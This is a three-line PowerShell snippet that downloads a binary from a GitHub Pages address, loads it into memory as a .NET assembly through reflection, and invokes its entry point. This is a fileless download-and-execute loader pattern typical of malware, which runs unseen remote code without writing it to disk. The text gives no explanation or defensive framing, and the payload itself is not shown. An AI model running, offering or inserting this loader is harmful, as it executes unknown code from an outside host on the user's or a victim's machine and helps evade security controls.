$assemblyByte = (New-Object Net.WebClient).DownloadData("https://hakkyahud.github.io/SpecialCake4Teh");
$assembly = [System.Reflection.Assembly]::Load($assemblyByte);
$assembly.EntryPoint.Invoke($null, $null)